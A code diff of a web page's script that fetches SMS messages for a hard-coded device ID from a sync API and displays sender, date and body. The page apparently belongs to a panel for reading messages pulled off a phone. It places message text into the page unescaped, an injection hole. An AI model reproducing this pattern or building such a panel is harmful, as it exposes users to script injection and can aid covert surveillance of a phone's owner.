@@ -146,56 +146,67 @@
         </div>
     </div>
 
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            fetchSMS();
-        });
+   <script>
+    document.addEventListener("DOMContentLoaded", function() {
+        fetchSMS();
+    });
 
-        function fetchSMS() {
-          const DEVICE_ID = "M2103K19I"; 
+    function fetchSMS() {
+        // Yahan wo ID daalo jo Dashboard par dikh rahi hai
+        const DEVICE_ID = "M2103K19I"; 
 
-            fetch(`/api/sms/${deviceId}`)
-                .then(response => response.json())
-                .then(data => {
-                    const listContainer = document.getElementById("sms-list");
-                    listContainer.innerHTML = ""; 
+        // ✅ URL thik kar diya hai (/api/get-data/...)
+        fetch(`/api/get-data/${DEVICE_ID}/sms`)
+            .then(response => response.json())
+            .then(data => {
+                const listContainer = document.getElementById("sms-list");
+                listContainer.innerHTML = ""; 
 
-                    if (data.length === 0) {
-                        listContainer.innerHTML = `
-                            <div class="empty-state">
-                                <i class="fa-regular fa-envelope-open"></i>
-                                <p>No SMS Found</p>
-                            </div>`;
-                        return;
+                if (!data || data.length === 0) {
+                    listContainer.innerHTML = `
+                        <div class="empty-state">
+                            <i class="fa-regular fa-envelope-open"></i>
+                            <p>No SMS Found</p>
+                        </div>`;
+                    return;
+                }
+
+                // Data ko naye se purane order mein dikhane ke liye (Optional)
+                // data.reverse(); 
+
+                data.forEach(sms => {
+                    const smsCard = document.createElement("div");
+                    smsCard.className = "sms-card";
+                    
+                    // Agar date number mein hai to convert karo
+                    let dateDisplay = sms.date;
+                    if(!isNaN(sms.date)) {
+                        dateDisplay = new Date(parseInt(sms.date)).toLocaleString();
                     }
 
-                    data.forEach(sms => {
-                        const smsCard = document.createElement("div");
-                        smsCard.className = "sms-card";
-                        
-                        smsCard.innerHTML = `
-                            <div class="sms-header">
-                                <span class="sender"><i class="fa-solid fa-user"></i> ${sms.address}</span>
-                                <span class="date">${sms.date}</span>
-                            </div>
-                            <div class="message-body">
-                                ${sms.body}
-                            </div>
-                        `;
-                        listContainer.appendChild(smsCard);
-                    });
-                })
-                .catch(err => {
-                    console.error("Error:", err);
-                    document.getElementById("sms-list").innerHTML = `
-                        <div class="empty-state" style="color: #ff4444;">
-                            <i class="fa-solid fa-circle-exclamation"></i>
-                            <p>Failed to load SMS</p>
-                        </div>`;
+                    smsCard.innerHTML = `
+                        <div class="sms-header">
+                            <span class="sender"><i class="fa-solid fa-user"></i> ${sms.address || 'Unknown'}</span>
+                            <span class="date">${dateDisplay}</span>
+                        </div>
+                        <div class="message-body">
+                            ${sms.body || 'Empty Message'}
+                        </div>
+                    `;
+                    listContainer.appendChild(smsCard);
                 });
-        }
-    </script>
-
+            })
+            .catch(err => {
+                console.error("Error:", err);
+                document.getElementById("sms-list").innerHTML = `
+                    <div class="empty-state" style="color: #ff4444;">
+                        <i class="fa-solid fa-circle-exclamation"></i>
+                        <p>No Data Yet (Wait for sync)</p>
+                    </div>`;
+            });
+    }
+</script>
 </body>
 </html>
+
 
